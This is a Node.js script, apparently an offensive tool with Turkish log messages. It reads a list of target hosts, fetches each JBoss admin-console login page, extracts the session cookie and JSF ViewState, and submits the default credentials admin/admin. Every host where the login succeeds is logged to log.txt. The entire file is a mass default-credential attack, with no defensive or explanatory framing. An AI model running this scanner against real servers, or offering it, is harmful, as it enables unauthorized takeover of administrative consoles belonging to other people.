var fs = require('fs');
var request = require('request');
var logwrite = fs.createWriteStream('log.txt', {
  flags: 'a'
})
var arraysite = fs.readFileSync(process.argv[2],"utf8").toString().split("\n");

arraysite.forEach(function(usesite) {

		try {
			
        var options = {
            url: usesite+"/admin-console/login.seam",
            method: 'GET',
            headers: {
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language':'en-US,en;q=0.5',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/55.0',
                'Upgrade-Insecure-Requests':'1',
                'Accept-Encoding':'gzip, deflate'
            }
        };
        var ilkcookie=""
        request.get("http://"+usesite+"/admin-console/login.seam",function(err,res,body){
			
        	if(!err) {
				
			
			var cookiesi=res.headers['set-cookie'];
			
            if(cookiesi!=null) {
                cookiesi.forEach(function(uss) {
                    var ilkcookie=uss
					console.log("Cookie verisi alındı: " +uss)
					
					});
				
            }
            
            var result = body.match('id="javax.faces.ViewState" value="(.*?)"');
            if(result!=null) {
                var viewstate = result[1];
				console.log("javax.faces.ViewState değeri alındı")
            }
            
            
            
            var postdata = {'login_form':'login_form',
                    'login_form:name':'admin',
                    'login_form:password':'admin',
                    'login_form:submit':'Login',
                    'javax.faces.ViewState' : viewstate}

			
            var optionspost = {
            url: "http://"+usesite+"/admin-console/login.seam",
            method: 'POST',
            form: postdata,
            headers: {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/55.0',
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
                "Accept-Encoding": "gzip, deflate",
                'Cookie':  ilkcookie,
                'Referer': usesite+"/admin-console/login.seam",
                'Content-Type': 'application/x-www-form-urlencoded',
                'Upgrade-Insecure-Requests':'1',
                'Accept-Encoding':'gzip, deflate'}}
                //'Content-Length': Buffer.byteLength(postdata,'utf8')



                request.post(optionspost,function(err, resp, body){
                var islemyapilan=optionspost["url"]
                if(!err) {
                        if(body.indexOf('login_form:password')==-1) {
                            logwrite.write("Login Oldu : "+islemyapilan+"\n user:admin pass:admin")
                            console.log("Login Oldu : "+islemyapilan+"\n user:admin pass:admin" );
                        }

                    }

                });
            
        }
        
        
        });


	
	}catch(err) {
				
				
			}
              


});
